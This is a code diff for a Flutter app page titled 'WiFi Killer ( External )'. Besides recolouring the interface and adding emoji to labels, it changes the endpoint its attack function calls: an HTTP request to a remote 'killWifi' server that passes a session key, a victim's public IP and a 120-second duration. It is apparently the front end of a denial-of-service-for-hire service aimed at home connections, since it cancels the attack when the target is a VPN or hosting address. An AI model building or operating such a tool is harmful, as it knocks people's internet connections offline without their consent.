@@ -18,11 +18,11 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
   bool isLoading = true;
   bool isAttacking = false;
 
-  final Color bloodRed = const Color(0xFF2A0000);   // Diubah jadi Violet Utama
-  final Color darkRed = const Color(0xFF120000);   // Diubah jadi Violet Gelap
+  final Color bloodRed = const Color(0xFF7B1FA2);   // Diubah jadi Violet Utama
+  final Color darkRed = const Color(0xFF4A148C);   // Diubah jadi Violet Gelap
   final Color lightRed = const Color(0xFFE040FB);  // Diubah jadi Violet Terang (Accent)
-  final Color deepBlack = const Color(0xFF120000); // Tetap Hitam (Background)
-  final Color cardDark = const Color(0xFF2A0000);  // Tetap Hitam (Background Kartu)
+  final Color deepBlack = const Color(0xFF0A0A0A); // Tetap Hitam (Background)
+  final Color cardDark = const Color(0xFF1A1A1A);  // Tetap Hitam (Background Kartu)
 
   @override
   void initState() {
@@ -68,13 +68,13 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
   Future<void> _attackTarget() async {
     setState(() => isAttacking = true);
     final url = Uri.parse(
-        "http://xterclose.zorryxhostz.my.id:2000/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
+        "http://respanelomdhangicir.omdhanasu.my.id:2139/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
     try {
       final res = await http.get(url);
       if (res.statusCode == 200) {
-        _showAlert("Attack Sent", "WiFi attack sent to $publicIp");
+        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
       } else {
-        _showAlert("Failed", "Server rejected request.");
+        _showAlert("❌ Failed", "Server rejected request.");
       }
     } catch (e) {
       _showAlert("Error", "Network error: $e");
@@ -142,7 +142,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
       backgroundColor: deepBlack,
       appBar: AppBar(
         title: const Text(
-          "WiFi Killer ( External )",
+          "📡 WiFi Killer ( External )",
           style: TextStyle(fontFamily: 'Orbitron', color: Colors.white),
         ),
         backgroundColor: darkRed,
@@ -152,7 +152,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
       body: Container(
         decoration: BoxDecoration(
           gradient: LinearGradient(
-            colors: [deepBlack, Color(0xFF120000)],
+            colors: [deepBlack, Colors.black],
             begin: Alignment.topCenter,
             end: Alignment.bottomCenter,
           ),
@@ -165,7 +165,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
             crossAxisAlignment: CrossAxisAlignment.stretch,
             children: [
               const Text(
-                "System Information",
+                "🎯 System Information",
                 style: TextStyle(
                     fontSize: 20,
                     color: Colors.white,
@@ -184,12 +184,12 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
                 Container(
                   padding: const EdgeInsets.all(16),
                   decoration: BoxDecoration(
-                    color: Colors.pink.shade900,
+                    color: Colors.red[900],
                     borderRadius: BorderRadius.circular(12),
                     border: Border.all(color: bloodRed),
                   ),
                   child: const Text(
-                    "Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
+                    "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
                     textAlign: TextAlign.center,
                     style: TextStyle(
                         color: Colors.white,
